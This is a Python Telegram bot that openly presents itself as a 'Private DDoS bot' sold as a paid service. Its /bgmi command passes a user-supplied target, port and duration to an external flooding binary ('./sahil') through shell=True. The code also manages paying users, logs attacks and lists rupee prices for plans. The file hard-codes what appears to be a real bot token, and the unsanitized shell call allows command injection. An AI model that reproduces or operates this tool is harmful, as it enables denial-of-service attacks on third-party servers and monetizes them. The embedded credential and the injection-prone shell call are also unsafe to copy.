import telebot
import subprocess
import datetime
import os
import threading

# Insert your Telegram bot token here
bot = telebot.TeleBot('7456621495:AAFis7aKTDQR6kHV0AgMIWVqJesYaKKz4Dw')

# Admin user IDs
admin_id = {"6512242172"}

USER_FILE = "users.txt"
LOG_FILE = "log.txt"

# Active attack tracking
attack_running = False
attack_lock = threading.Lock()

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    with open(LOG_FILE, "a") as file:
        file.write(f"UserID: {user_id} | Target: {target} | Port: {port} | Time: {time} | {datetime.datetime.now()}\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} added successfully ☑️."
            else:
                response = "User already in bot ✔️."
        else:
            response = "Enter a user ID to add."
    else:
        response = "Only for admin ❗."
    bot.reply_to(message, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for uid in allowed_user_ids:
                        file.write(f"{uid}\n")
                response = f"User {user_to_remove} removed successfully ☑️."
            else:
                response = f"User {user_to_remove} not found."
        else:
            response = "Specify a user ID to remove."
    else:
        response = "Only for admin ❗."
    bot.reply_to(message, response)

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                response = "Authorized Users:\n" + "\n".join(user_ids) if user_ids else "No data found."
        except FileNotFoundError:
            response = "No data found."
    else:
        response = "Unauthorized access ❌."
    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        with open(LOG_FILE, "w") as file:
            file.truncate(0)
        response = "Logs cleared successfully ✅."
    else:
        response = "Only for admin ❗."
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            with open(LOG_FILE, "rb") as file:
                bot.send_document(message.chat.id, file)
        else:
            response = "No logs found."
            bot.reply_to(message, response)
    else:
        response = "Unauthorized access ❌."
        bot.reply_to(message, response)

@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    global attack_running
    user_id = str(message.chat.id)

    if user_id not in allowed_user_ids:
        bot.reply_to(message, "You are not authorized 🤬")
        return

    command = message.text.split()
    if len(command) != 4:
        bot.reply_to(message, "Usage: /bgmi <target> <port> <time>")
        return

    target, port, time_duration = command[1], int(command[2]), int(command[3])

    if time_duration > 300:
        bot.reply_to(message, "Error: Max attack time is 300 seconds ❌.")
        return

    # Check if an attack is already running
    with attack_lock:
        if attack_running:
            bot.reply_to(message, "Another attack is already running! Please wait until it finishes. ❌")
            return
        attack_running = True  # Mark attack as running

    bot.reply_to(message, f"🚀 Attack started on {target}:{port} for {time_duration} sec")
    log_command(user_id, target, port, time_duration)

    # Run attack
    try:
        process = subprocess.Popen(f"./sahil {target} {port} {time_duration} 900", shell=True)
        process.wait(timeout=time_duration)  # Wait for attack to complete
    except subprocess.TimeoutExpired:
        process.kill()  # If attack runs longer than expected, kill it
    finally:
        with attack_lock:
            attack_running = False  # Mark attack as finished

    bot.reply_to(message, f"✅ Attack on {target}:{port} finished successfully!")

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = '''Available Commands:
 /bgmi <target> <port> <time> : Start attack 😈.
 /mylogs : Check your attack history 📝.
 /rules : Read carefully ⚠️.
 /plan : Buy from admin ✓.

**Admin Commands:**
 /add <userId> : Add new user.
 /remove <userId> : Remove user.
 /allusers : List authorized users.
 /logs : Show all logs.
 /clearlogs : Clear log file.
 /setexpire <userId> <time> : Set user expiration.
'''
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    bot.reply_to(message, "Welcome to the Private DDoS bot! Use /help to see commands.")

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    bot.reply_to(message, "Only one rule: **Do not spam.**")

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    bot.reply_to(message, '''Buy from @offx_sahil:

VIP Plan:
-> Attack Time: 300 sec
-> Cooldown: 1 min
-> Concurrent Attacks: 10

Price List:
- 1 Day: ₹100
- 1 Week: ₹500
- 1 Month: ₹1500
''')

while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
        